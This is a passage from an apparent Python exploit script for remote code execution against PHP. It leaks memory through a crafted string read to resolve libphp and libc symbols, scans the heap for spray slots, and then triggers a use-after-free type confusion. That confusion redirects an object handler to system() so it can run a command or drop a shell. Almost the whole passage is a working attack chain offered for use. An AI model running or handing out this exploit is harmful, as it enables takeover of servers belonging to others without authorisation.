        # Build a merged window if needed
        if st_off < 0 or sy_off < 0 or st_off > len(wdata) or sy_off > len(wdata):
            if debug: print(f"      [dbg] symtab/strtab outside window, reading extended region")
            # Read a window anchored at symtab (use strtab-symtab as rough size guide)
            sym_r = isstring_read(symtab - 0x10, timeout=3)
            if sym_r is None:
                if debug: print(f"      [dbg] symtab region read failed")
                return None
            sym_len, sym_data = sym_r
            if debug: print(f"      [dbg] symtab region: len={sym_len} got={len(sym_data)}")
            # Build merged window covering gnu_hash region + symtab region
            # Merge: create a virtual address space covering both ranges
            new_wbase = min(wbase, symtab + 8)
            new_wend = max(wbase + len(wdata), symtab + 8 + len(sym_data))
            merged = bytearray(new_wend - new_wbase)
            # Copy original window
            o1 = wbase - new_wbase
            merged[o1:o1+len(wdata)] = wdata
            # Copy symtab region
            o2 = (symtab + 8) - new_wbase
            merged[o2:o2+len(sym_data)] = sym_data
            wdata = bytes(merged)
            wbase = new_wbase

        result = gnu_hash_lookup_window(wdata, wbase, gnu_hash_addr, symtab, strtab, names)
        if result:
            for name, offset in list(result.items()):
                result[name] = offset + base
            if pltgot_addr:
                result['__pltgot__'] = pltgot_addr
            if dyn_addr:
                result['__dynamic__'] = dyn_addr
        elif pltgot_addr or dyn_addr:
            result = {}
            if pltgot_addr: result['__pltgot__'] = pltgot_addr
            if dyn_addr: result['__dynamic__'] = dyn_addr
        return result if result else None

    # Try each ELF candidate — largest phnum first (libphp has the most)
    php_syms = None
    php_pltgot = None
    any_pltgot = None
    libc_system_addr = None
    elf_base = None
    wdata = None
    wbase = None

    for base, phnum in sorted(elf_candidates, key=lambda x: -x[1]):
        print(f"\n  Trying ELF @ 0x{base:x} (phnum={phnum})")

        # Try PHP symbols first
        if php_syms is None:
            syms = elf_resolve_symbols(base, phnum,
                ['executor_globals', 'compiler_globals', 'std_object_handlers'],
                debug=True)
            if syms and 'executor_globals' in syms:
                php_syms = syms
                elf_base = base
                php_pltgot = syms.pop('__pltgot__', None)
                php_dynamic = syms.pop('__dynamic__', None)
                win = elf_read_window(base, phnum)
                if win:
                    wbase, wdata, _ = win
                for name, addr in syms.items():
                    if not name.startswith('__'):
                        print(f"    {name} = 0x{addr:x} (offset 0x{addr-base:x})")
                if php_pltgot:
                    print(f"    PLTGOT = 0x{php_pltgot:x}")

        # Try libc symbols (system is exported by libc)
        if libc_system_addr is None:
            syms = elf_resolve_symbols(base, phnum, ['system'])
            if syms and 'system' in syms:
                libc_system_addr = syms['system']
                any_pltgot = syms.get('__pltgot__', any_pltgot)
                print(f"    system() = 0x{libc_system_addr:x} (libc @ 0x{base:x})")
            elif syms and '__pltgot__' in syms:
                any_pltgot = syms['__pltgot__']

        if php_syms and libc_system_addr:
            break

    # ── Fallback: link_map chain walk ─────────────────────────────────
    # If the 2MB scan missed libphp or libc, walk the dynamic linker's
    # link_map linked list via GOT[1]. Each entry has l_addr (base) and
    # l_name (path string). We check names for "libphp" and "libc".
    if php_syms is None and any_pltgot:
        print(f"\n  PHP not in 2MB scan -- walking link_map from PLTGOT 0x{any_pltgot:x}")
        r = isstring_read(any_pltgot + 0x8, timeout=3)
        link_map_ptr = None
        if r and r[1] and len(r[1]) >= 8:
            link_map_ptr = struct.unpack_from('<Q', r[1], 0)[0]
            if link_map_ptr < 0x10000 or link_map_ptr > 0x7FFFFFFFFFFF:
                link_map_ptr = None

        if link_map_ptr:
            print(f"    link_map @ 0x{link_map_ptr:x}")
            visited = set()
            cur = link_map_ptr
            # First walk backward to head
            for _ in range(64):
                if cur in visited or cur == 0 or cur < 0x10000:
                    break
                visited.add(cur)
                r = isstring_read(cur, timeout=3)
                if r is None:
                    break
                slen, sdata = r
                if len(sdata) < 40:
                    break
                l_prev = struct.unpack_from('<Q', sdata, 24)[0]
                if l_prev == 0 or l_prev < 0x10000:
                    break
                cur = l_prev

            head = cur
            visited.clear()
            cur = head
            for _ in range(128):
                if cur in visited or cur == 0 or cur < 0x10000:
                    break
                visited.add(cur)
                r = isstring_read(cur, timeout=3)
                if r is None:
                    break
                slen, sdata = r
                if len(sdata) < 40:
                    break
                l_addr = struct.unpack_from('<Q', sdata, 0)[0]
                l_name = struct.unpack_from('<Q', sdata, 8)[0]
                l_next = struct.unpack_from('<Q', sdata, 16 + 8)[0]

                name_str = b''
                if 0x10000 < l_name < 0x7FFFFFFFFFFF:
                    nr = isstring_read(l_name, timeout=2)
                    if nr and nr[1]:
                        end = nr[1].find(b'\x00')
                        name_str = nr[1][:end] if end >= 0 else nr[1][:64]

                if l_addr > 0x10000:
                    short_name = name_str[-40:] if len(name_str) > 40 else name_str
                    print(f"    DSO @ 0x{l_addr:x} {short_name.decode('latin-1', errors='replace')}")

                    if b'libphp' in name_str:
                        nr2 = isstring_read(l_addr + 0x10, timeout=3)
                        if nr2 and nr2[0] == 64 and len(nr2[1]) >= 0x12:
                            epn = struct.unpack_from('<H', nr2[1], 0x10)[0]
                            syms = elf_resolve_symbols(l_addr, epn,
                                ['executor_globals', 'compiler_globals', 'std_object_handlers'],
                                debug=True)
                            if syms and 'executor_globals' in syms:
                                php_syms = syms
                                elf_base = l_addr
                                php_pltgot = syms.pop('__pltgot__', None)
                                php_dynamic = syms.pop('__dynamic__', None)
                                win = elf_read_window(l_addr, epn)
                                if win:
                                    wbase, wdata, _ = win
                                for name, addr in syms.items():
                                    if not name.startswith('__'):
                                        print(f"      {name} = 0x{addr:x}")
                                if not libc_system_addr:
                                    pass

                    if b'libc' in name_str and b'libcrypt' not in name_str and not libc_system_addr:
                        nr2 = isstring_read(l_addr + 0x10, timeout=3)
                        if nr2 and nr2[0] == 64 and len(nr2[1]) >= 0x12:
                            epn = struct.unpack_from('<H', nr2[1], 0x10)[0]
                            syms = elf_resolve_symbols(l_addr, epn, ['system'])
                            if syms and 'system' in syms:
                                libc_system_addr = syms['system']
                                print(f"      system() = 0x{libc_system_addr:x}")

                if php_syms and libc_system_addr:
                    break
                cur = l_next

    if php_syms is None:
        print("\n  PHP symbols not found"); return

    # ── Fallback strategies to find libc ──────────────────────────────
    # If libc wasn't found by the initial ELF scan, try progressively
    # more expensive strategies: GOT pointer chasing, data segment scan,
    # backward page scan from highest DSO, forward 2MB probe.
    if libc_system_addr is None and elf_base is not None:
        print(f"\n  libc not in 2MB scan -- discovering via link_map / data segment")
        soh_addr = php_syms.get('std_object_handlers')
        scan_base = php_pltgot if php_pltgot else (soh_addr if soh_addr else None)

        def find_elf_base(ptr, max_pages=256):
            page = ptr & ~0xFFF
            consec_crash = 0
            for pi in range(max_pages):
                cand = page - pi * 0x1000
                if cand <= 0:
                    break
                r = isstring_read(cand + 0x10, timeout=2)
                if r is None:
                    consec_crash += 1
                    if consec_crash >= 8:
                        break
                    continue
                consec_crash = 0
                slen2, sdata2 = r
                if slen2 != 64 or len(sdata2) < 0x12:
                    continue
                eh = struct.unpack_from('<H', sdata2, 0x0C)[0]
                eph = struct.unpack_from('<H', sdata2, 0x0E)[0]
                epn = struct.unpack_from('<H', sdata2, 0x10)[0]
                if eh == 64 and eph == 56 and 3 <= epn <= 20:
                    return (cand, epn, pi)
            return None

        # Strategy 1: Read .dynamic entries using anchor technique
        dyn_data = None
        if php_dynamic:
            print(f"    PT_DYNAMIC @ 0x{php_dynamic:x}")
            # First try existing window
            if wdata and wbase:
                dyn_off_in_win = php_dynamic - wbase
                if 0 <= dyn_off_in_win < len(wdata) - 64:
                    remaining = len(wdata) - dyn_off_in_win
                    dyn_data = wdata[dyn_off_in_win:dyn_off_in_win + min(remaining, 1024)]
                    print(f"    .dynamic from window (off=0x{dyn_off_in_win:x}, {len(dyn_data)}b)")
            # Fallback: use d_val anchor (same as elf_resolve_symbols)
            # dyn_data_base: absolute address that dyn_data[0] corresponds to
            dyn_data_base = php_dynamic
            if dyn_data is None:
                for anchor_off in [0x08, 0x18, 0x28, 0x38, 0x48]:
                    r = isstring_read(php_dynamic - anchor_off, timeout=3)
                    if r is None:
                        continue
                    slen, sdata = r
                    if slen < 64 or slen > 0x200000 or len(sdata) < 64:
                        continue
                    # data begins at fake_str + 0x18 = php_dynamic - anchor_off + 0x18
                    data_abs_start = php_dynamic - anchor_off + 0x18
                    skip = max(0, anchor_off - 0x18)
                    dyn_data = sdata[skip:skip + min(1024, len(sdata) - skip)]
                    dyn_data_base = data_abs_start + skip
                    if len(dyn_data) >= 16:
                        tag0 = struct.unpack_from('<Q', dyn_data, 0)[0]
                        if tag0 == 0 or (tag0 > 100 and tag0 < 0x6FFFFEF5):
                            dyn_data = None
                            continue
                    print(f"    .dynamic via anchor -0x{anchor_off:x} (len={slen}, got={len(dyn_data)}b)")
                    break

            if dyn_data:
                r_debug_ptr = None
                got_addr = None
                pltrelsz_val = None
                pltrelsz_off = None
                for di in range(len(dyn_data) // 16):
                    d_tag = struct.unpack_from('<Q', dyn_data, di * 16)[0]
                    d_val = struct.unpack_from('<Q', dyn_data, di * 16 + 8)[0]
                    if d_tag == 0:
                        break
                    if d_tag == 2:  # DT_PLTRELSZ
                        pltrelsz_val = d_val
                        pltrelsz_off = di * 16 + 8
                    if d_tag == 3:  # DT_PLTGOT
                        got_addr = elf_base + d_val if d_val < 0x10000000 else d_val
                        print(f"    DT_PLTGOT → 0x{got_addr:x}")
                    if d_tag == 21:  # DT_DEBUG
                        r_debug_ptr = d_val
                        print(f"    DT_DEBUG → r_debug @ 0x{r_debug_ptr:x}")

        # Strategy 1.5: Use DT_PLTRELSZ as IS_STRING len to bulk-read GOT
        # .got.plt follows .dynamic in memory and contains resolved function
        # pointers into libc. DT_PLTRELSZ is a safe len value (typically a few KB).
        # We scan the GOT data for external pointers, trace each to its ELF base,
        # and try resolving system().
        if libc_system_addr is None and dyn_data and pltrelsz_val and pltrelsz_off and got_addr:
            pltrelsz_addr = dyn_data_base + pltrelsz_off  # absolute addr of d_val
            fake_str = pltrelsz_addr - 0x10
            print(f"    Reading GOT via DT_PLTRELSZ len={pltrelsz_val} (0x{pltrelsz_val:x})")
            r = isstring_read(fake_str, timeout=5)
            if r is not None:
                got_len, got_data = r
                print(f"    GOT read: len={got_len}, got {len(got_data)} bytes")
                data_start = pltrelsz_addr + 0x08  # where data begins in address space
                # Find .got.plt entries within this data
                if got_addr >= data_start and got_addr < data_start + len(got_data):
                    got_off = got_addr - data_start
                    # Verify: GOT[0] should be php_dynamic
                    if got_off + 24 <= len(got_data):
                        g0 = struct.unpack_from('<Q', got_data, got_off)[0]
                        print(f"    GOT[0]=0x{g0:x} (expect dynamic_off=0x{php_dynamic - elf_base:x})")
                    # Collect external pointers from GOT data
                    ext_ptrs = []
                    libphp_end = elf_base + 0x1800000
                    for gi in range(0, len(got_data) - 7, 8):
                        ptr = struct.unpack_from('<Q', got_data, gi)[0]
                        if ptr < 0x100000000 or ptr > 0x7FFFFFFFFFFF:
                            continue
                        if elf_base <= ptr < libphp_end:
                            continue
                        if not any(abs(ptr - ep) < 0x80000 for ep in ext_ptrs):
                            ext_ptrs.append(ptr)

                    # Focus on pointers close to libphp (skip vDSO/Apache binary far away)
                    nearby = [p for p in ext_ptrs if abs(p - elf_base) < 0x10000000]
                    nearby.sort(key=lambda p: p)
                    print(f"    External pointer groups: {len(ext_ptrs)} total, {len(nearby)} nearby")

                    for nidx, ep in enumerate(nearby):
                        if libc_system_addr:
                            break
                        print(f"    Trying nearby[{nidx}] = 0x{ep:x}")
                        page = ep & ~0xFFF
                        found_base = None
                        # Search from far to near (r-- region probed first, less crashes)
                        for est_off in range(0x7F000, 0x1F000, -0x1000):
                            cand = page - est_off
                            if cand <= 0:
                                continue
                            r2 = isstring_read(cand + 0x10, timeout=2)
                            if r2 is None:
                                continue
                            slen2, sdata2 = r2
                            if slen2 != 64 or len(sdata2) < 0x12:
                                continue
                            eh = struct.unpack_from('<H', sdata2, 0x0C)[0]
                            eph = struct.unpack_from('<H', sdata2, 0x0E)[0]
                            epn = struct.unpack_from('<H', sdata2, 0x10)[0]
                            if eh == 64 and eph == 56 and 3 <= epn <= 20:
                                print(f"      ELF @ 0x{cand:x} (phnum={epn}, est_off=0x{est_off:x})")
                                if epn >= 12:
                                    found_base = cand
                                    syms = elf_resolve_symbols(cand, epn, ['system'], debug=True)
                                    if syms and 'system' in syms:
                                        libc_system_addr = syms['system']
                                        print(f"      system() = 0x{libc_system_addr:x}")
                                        break
                        if found_base is None:
                            # Fallback: standard backward scan
                            result = find_elf_base(ep, max_pages=128)
                            if result:
                                ebase, epn, _ = result
                                print(f"      DSO @ 0x{ebase:x} (phnum={epn})")
                                syms = elf_resolve_symbols(ebase, epn, ['system'], debug=True)
                                if syms and 'system' in syms:
                                    libc_system_addr = syms['system']
                                    print(f"      system() = 0x{libc_system_addr:x}")
                    else:
                        print(f"    No external pointers found in GOT data")
                else:
                    # .got.plt not within read range; scan the whole data for pointers
                    print(f"    .got.plt not in range (got=0x{got_addr:x} data=0x{data_start:x}+{len(got_data)})")
                    ext_ptrs = []
                    for qi in range(0, len(got_data) - 7, 8):
                        ptr = struct.unpack_from('<Q', got_data, qi)[0]
                        if ptr < 0x100000000 or ptr > 0x7FFFFFFFFFFF:
                            continue
                        if abs(ptr - elf_base) > 0x2000000:
                            if not any(abs(ptr - ep) < 0x200000 for ep in ext_ptrs):
                                ext_ptrs.append(ptr)
                    if ext_ptrs:
                        ext_ptrs.sort(key=lambda p: abs(p - elf_base))
                        print(f"    Found {len(ext_ptrs)} external pointer groups")
                        for ep in ext_ptrs[:8]:
                            if libc_system_addr:
                                break
                            result = find_elf_base(ep, max_pages=256)
                            if result:
                                ebase, epn, pi = result
                                print(f"      DSO @ 0x{ebase:x} (phnum={epn}, {pi}pg back)")
                                syms = elf_resolve_symbols(ebase, epn, ['system'], debug=True)
                                if syms and 'system' in syms:
                                    libc_system_addr = syms['system']
                                    print(f"      system() = 0x{libc_system_addr:x}")
            else:
                print(f"    GOT read via DT_PLTRELSZ failed (crash)")

        # Strategy B: Find DSOs via data scan, then scan backward from
        # highest-address DSO to find libc (which is just before ld-linux)
        if libc_system_addr is None and scan_base:
            print(f"    Scanning data segment for DSO pointers")
            external_ptrs = []
            seen_ranges = set()
            for delta in range(-2, 16):
                seen_ranges.add((elf_base >> 21) + delta)
            for delta in range(-2, 3):
                seen_ranges.add((chunk >> 21) + delta)
            for scan_off in [0x380, 0x0, 0x800]:
                fs = scan_base + scan_off
                r = isstring_read(fs, timeout=3)
                if r is None:
                    continue
                slen, sdata = r
                if slen < 0x40 or slen > 0x200000 or len(sdata) < 0x40:
                    continue
                for qi in range(0, len(sdata) - 7, 8):
                    ptr = struct.unpack_from('<Q', sdata, qi)[0]
                    if ptr < 0x100000000 or ptr > 0x7FFFFFFFFFFF:
                        continue
                    range_key = ptr >> 21
                    if range_key in seen_ranges:
                        continue
                    seen_ranges.add(range_key)
                    external_ptrs.append(ptr)
                break

            # Sort by proximity to libphp so nearby DSOs (libc) are tried first
            external_ptrs.sort(key=lambda p: abs(p - elf_base))

            # Trace each external pointer to its ELF base and try resolving system
            found_elfs = []
            for ext_ptr in external_ptrs:
                if libc_system_addr:
                    break
                result = find_elf_base(ext_ptr)
                if result:
                    ebase, epn, _ = result
                    if not any(ebase == fb for fb, _ in found_elfs):
                        found_elfs.append((ebase, epn))
                        print(f"      DSO @ 0x{ebase:x} (phnum={epn})")
                        syms = elf_resolve_symbols(ebase, epn, ['system'], debug=True)
                        if syms and 'system' in syms:
                            libc_system_addr = syms['system']
                            print(f"      system() = 0x{libc_system_addr:x}")

            # Find highest-address DSO in same address range as libphp
            # (filter out main executable which is at a different address range)
            same_range = [(b, p) for b, p in found_elfs
                          if abs(b - elf_base) < 0x20000000]
            if same_range:
                max_base = max(b for b, _ in same_range)
                print(f"    Highest nearby DSO: 0x{max_base:x}")
                print(f"    Scanning backward for libc...")
                tried_bk = 0
                for pi in range(512):
                    if libc_system_addr:
                        break
                    cand = max_base - pi * 0x1000
                    if cand <= elf_base + 0x1000000:
                        break
                    r = isstring_read(cand + 0x10, timeout=2)
                    tried_bk += 1
                    if r is None:
                        continue
                    slen, sdata = r
                    if slen != 64 or len(sdata) < 0x12:
                        continue
                    eh = struct.unpack_from('<H', sdata, 0x0C)[0]
                    eph = struct.unpack_from('<H', sdata, 0x0E)[0]
                    epn = struct.unpack_from('<H', sdata, 0x10)[0]
                    if eh == 64 and eph == 56 and 3 <= epn <= 20:
                        if cand == max_base:
                            continue  # skip the DSO we started from
                        print(f"      ELF @ 0x{cand:x} (phnum={epn}, {pi} pages back)")
                        syms = elf_resolve_symbols(cand, epn, ['system'])
                        if syms and 'system' in syms:
                            libc_system_addr = syms['system']
                            print(f"      system() = 0x{libc_system_addr:x}")
                            break
                print(f"      ({tried_bk} probes)")

        # Strategy C: Scan forward from libphp end for ELF headers
        # DSOs are loaded near each other; libc is typically within ~100MB
        # Coarse scan at 1MB steps; when mapped memory found, trace back to ELF base
        if libc_system_addr is None:
            eg = php_syms.get('executor_globals', 0)
            scan_start = ((eg + 0x10000) & ~0xFFF) if eg else elf_base + 0x1800000
            print(f"    Scanning forward from 0x{scan_start:x} for DSOs")
            probes = 0
            consec_unmap = 0
            found_bases = set()
            found_bases.add(elf_base)
            step = 0x200000  # 2MB steps to cover gaps faster
            for mi in range(200):
                if libc_system_addr:
                    break
                addr = scan_start + mi * step
                # First check: is this exact address an ELF header?
                r = isstring_read(addr + 0x10, timeout=2)
                probes += 1
                if r is None:
                    consec_unmap += 1
                    if consec_unmap >= 80:
                        break
                    continue
                consec_unmap = 0
                slen, sdata = r
                if slen == 64 and len(sdata) >= 0x12:
                    eh = struct.unpack_from('<H', sdata, 0x0C)[0]
                    eph = struct.unpack_from('<H', sdata, 0x0E)[0]
                    epn = struct.unpack_from('<H', sdata, 0x10)[0]
                    if eh == 64 and eph == 56 and 3 <= epn <= 20 and addr not in found_bases:
                        found_bases.add(addr)
                        print(f"      ELF @ 0x{addr:x} (phnum={epn}, +{mi*2}MB)")
                        syms = elf_resolve_symbols(addr, epn, ['system'], debug=True)
                        if syms and 'system' in syms:
                            libc_system_addr = syms['system']
                            print(f"      system() = 0x{libc_system_addr:x}")
                            break
                        continue
                # Mapped but not ELF at this address — trace back to find ELF base
                result = find_elf_base(addr, max_pages=256)
                if result:
                    ebase, epn, pi = result
                    probes += pi + 1
                    if ebase not in found_bases:
                        found_bases.add(ebase)
                        print(f"      ELF @ 0x{ebase:x} (phnum={epn}, {pi}pg back from +{mi*2}MB)")
                        syms = elf_resolve_symbols(ebase, epn, ['system'], debug=True)
                        if syms and 'system' in syms:
                            libc_system_addr = syms['system']
                            print(f"      system() = 0x{libc_system_addr:x}")
                            break
            print(f"      ({probes} probes)")

    if libc_system_addr is None:
        print("\n  libc system() not found"); return
    if elf_base is None or wdata is None:
        print("\n  No usable ELF window"); return

    eg = php_syms['executor_globals']

    for elf_base_iter in [elf_base]:  # Keep indent structure for phases 4+

        # ── Phase 4: Read EG.function_table ────────────────────────────
        # executor_globals is in .bss. function_table is at EG+0x1C8 and
        # class_table at EG+0x1D0 (PHP 8.x). We need to find a non-zero
        # qword in the BSS that can serve as IS_STRING len to read both
        # pointers in a single isstring_read call.
        print(f"\n[Phase 4] Read EG.function_table")
        print(f"  EG @ 0x{eg:x}")

        bss_end = eg + 0x10000
        ft_addr = eg + 0x1C8   # EG.function_table (zend_array*)
        ct_addr = eg + 0x1D0   # EG.class_table (zend_array*)
        func_table = None
        class_table = None

        # Scan BSS for usable len anchors: any qword that, when interpreted as
        # zend_string.len, gives us a read window covering both ft and ct.
        print(f"  Scanning for len anchors (ft @ 0x{ft_addr:x}, ct @ 0x{ct_addr:x})")

        best_anchor = None
        for scan_off in range(-0x800, 0x1C0, 8):
            fs = eg + scan_off
            data_start = fs + 0x18
            if data_start > ft_addr:
                continue
            ft_data_off = ft_addr - data_start
            ct_data_off = ct_addr - data_start
            min_len = ct_data_off + 8
            max_len = bss_end - data_start
            if max_len <= 0:
                continue

            r = isstring_read(fs)
            if r is None:
                continue
            slen, sdata = r
            if slen <= 0 or slen > max_len:
                continue
            if slen >= min_len and ct_data_off + 8 <= len(sdata):
                func_table = struct.unpack_from('<Q', sdata, ft_data_off)[0]
                class_table = struct.unpack_from('<Q', sdata, ct_data_off)[0]
                print(f"  FOUND anchor at EG{scan_off:+#06x}: len={slen}")
                print(f"    function_table = 0x{func_table:x}")
                print(f"    class_table    = 0x{class_table:x}")
                best_anchor = (scan_off, slen)
                break
            elif slen > 0 and slen < 100000:
                if best_anchor is None or slen > best_anchor[1]:
                    best_anchor = (scan_off, slen)

        if func_table is None or func_table < 0x10000 or func_table > 0x7FFFFFFFFFFF:
            if best_anchor:
                print(f"  Best anchor: EG{best_anchor[0]:+#06x} len={best_anchor[1]} (too short)")
            print("  Could not read function_table")
            continue

        if class_table is None or class_table < 0x10000 or class_table > 0x7FFFFFFFFFFF:
            print("  Invalid class_table pointer")
            continue

        # ── Phase 5: system() already resolved from libc in Phase 3 ──
        system_addr = libc_system_addr
        print(f"\n[Phase 5] system() = 0x{system_addr:x} (resolved from libc)")

        # ── Phase 6: Find spray slot address via ZMM chunk metadata ──
        # To build the RCE payload, we need the absolute address of a spray
        # string's content (S). ZendMM chunks have a page map at chunk+0x250
        # that describes each 4KB page's allocation state. We find a bin-320
        # SRUN page, then probe slots within it for one containing our spray
        # (identified by zend_string.len == 280).
        print(f"\n[Phase 6] Find spray slot via chunk metadata")
        chunk_base = heap_ref & 0xFFFFFFFFFFE00000
        print(f"  chunk_base = 0x{chunk_base:x}")

        # chunk+0x40 as fake_str → len comes from heap.size at chunk+0x50
        r = isstring_read(chunk_base + 0x40)
        if r is None:
            print("  Chunk metadata read crashed"); continue
        heap_size, cdata = r
        print(f"  heap.size = {heap_size} (0x{heap_size:x}), got {len(cdata)} bytes")

        # Page map at chunk+0x250, data offset = 0x250 - 0x58 = 0x1F8
        MAP_OFF = 0x1F8
        if len(cdata) < MAP_OFF + 512 * 4:
            print(f"  Not enough data for page map"); continue

        bin320_start = None
        for pn in range(1, 512):
            info = struct.unpack_from('<I', cdata, MAP_OFF + pn * 4)[0]
            is_srun = (info & 0x80000000) != 0
            is_lrun = (info & 0x40000000) != 0
            if is_srun and not is_lrun:
                bin_num = info & 0x1F
                if bin_num == 16:
                    bin320_start = pn
                    free_count = (info >> 16) & 0x1FF
                    print(f"  Bin-320 SRUN at page {pn}, free_count={free_count}")
                    break

        if bin320_start is None:
            print("  No bin-320 run found in page map"); continue

        run_start = chunk_base + bin320_start * 0x1000
        print(f"  Run start = 0x{run_start:x}")

        # Probe slots to find spray strings (len=280)
        S = None
        for slot in range(64):
            addr = run_start + slot * 320
            r2 = isstring_read(addr)
            if r2 is None:
                continue
            slen, sdata = r2
            if slen == 280:
                S = addr + 0x18
                print(f"  Found spray at slot {slot} @ 0x{addr:x}")
                print(f"  S = 0x{S:x}")
                break

        if S is None:
            print("  No spray slot found"); continue

        # ── Phase 7: RCE via IS_OBJECT type confusion ─────────────────
        # Final UAF trigger with a crafted spray that makes the stale R:6
        # reference resolve as IS_OBJECT. The engine's serialize() then:
        #   1. Reads obj->ce and obj->handlers from our fake object
        #   2. Calls handlers->get_properties_for(obj, ...) at vtable+0xC8
        #   3. We point get_properties_for → libc system()
        #   4. system() receives obj as first arg, which starts with our cmd
        #
        # GC_ADDREF corruption: serialize calls php_add_var_hash → GC_ADDREF,
        # incrementing uint32 at obj+0x00. We put 0x09 (tab) at byte 0; after
        # +1 it becomes 0x0A (newline). The command at byte 1 onward is passed
        # to sh, which treats the leading newline as empty and runs our command.
        print(f"\n[Phase 7] RCE trigger")

        # First resolve stdClass ce via EG(class_table) — needed for fake obj
        std_class_ce = None
        print(f"  Resolving stdClass via class_table @ 0x{class_table:x}")
        r2 = isstring_read(class_table - 0x18)
        if r2 is None:
            print(f"  class_table HT read failed")
        elif r2[0] < 48 or len(r2[1]) < 32:
            print(f"  class_table HT: len={r2[0]} data={len(r2[1])} (too short)")
        else:
            htlen, htdata = r2
            ct_flags_mask = struct.unpack_from('<Q', htdata, 8)[0]
            ct_arData = struct.unpack_from('<Q', htdata, 16)[0]
            ct_nUsed = struct.unpack_from('<I', htdata, 24)[0]
            ct_nTableMask = (ct_flags_mask >> 32) & 0xFFFFFFFF
            ct_mask_s = ct_nTableMask if ct_nTableMask < 0x80000000 else ct_nTableMask - 0x100000000
            print(f"  class_table: nTableMask={ct_mask_s} arData=0x{ct_arData:x} nUsed={ct_nUsed}")
            ct_hash_size = (-ct_mask_s) * 4
            ct_alloc = ct_arData - ct_hash_size
            r3 = isstring_read(ct_alloc - 0x18)
            if r3 is None:
                print(f"  class_table data read crashed")
            else:
                ct_dlen, ct_ddata = r3
                key_b = b'stdclass'
                h = php_djb_hash(key_b)
                si = h | (ct_mask_s & 0xFFFFFFFF)
                si = si & 0xFFFFFFFF
                si_s = si - 0x100000000 if si >= 0x80000000 else si
                hso = (si_s + (-ct_mask_s)) * 4
                if 0 <= hso < len(ct_ddata) - 4:
                    bi = struct.unpack_from('<I', ct_ddata, hso)[0]
                    for _ in range(64):
                        if bi >= ct_nUsed or bi == 0xFFFFFFFF:
                            break
                        bo = ct_hash_size + bi * 32
                        if bo + 32 > len(ct_ddata):
                            break
                        bval = struct.unpack_from('<Q', ct_ddata, bo)[0]
                        bnext = struct.unpack_from('<I', ct_ddata, bo + 12)[0]
                        bh = struct.unpack_from('<Q', ct_ddata, bo + 16)[0]
                        bkey = struct.unpack_from('<Q', ct_ddata, bo + 24)[0]
                        h_flag = h | 0x8000000000000000
                        if bh == h_flag or bh == h:
                            if bkey > 0x10000:
                                rk = isstring_read(bkey)
                                if rk and rk[0] == 8 and rk[1][:8] == b'stdclass':
                                    std_class_ce = bval
                                    print(f"  stdClass ce = 0x{std_class_ce:x}")
                                    break
                        if bnext == 0xFFFFFFFF:
                            break
                        bi = bnext

        if std_class_ce is None:
            print("  Failed to resolve stdClass ce"); continue

        if args.resolve_only or args.shell:
            import json
            result = json.dumps({
                'system_addr': system_addr,
                'S': S,
                'std_class_ce': std_class_ce,
                'heap_ref': heap_ref,
            })
            print(f"\nRESOLVED:{result}")
            print(f"\n[*] Total requests: {req_count}")

            if args.shell:
                resolved = json.loads(result)
                drop_shell(resolved['std_class_ce'], resolved['system_addr'], resolved['S'])
            return

        cmd_str = args.cmd or 'id>/dev/shm/x'
        print(f"  Command: {cmd_str}")
        print(f"  stdClass ce = 0x{std_class_ce:x}")
        print(f"  system() = 0x{system_addr:x}")
        print(f"  S = 0x{S:x}")

        print(f"  Sending RCE payload...")
        output = fire_rce(cmd_str, std_class_ce, system_addr, S)
        if output is not None:
            print(f"  Response ({len(output)} bytes):")
            print(f"  {output[:500]}")
        else:
            print(f"  No response (worker may have crashed after execution)")

        print(f"\n[*] Total requests: {req_count}")
        return

    print(f"\n[-] Chain did not complete")
    print(f"[*] Total requests: {req_count}")

if __name__ == '__main__':
    main()
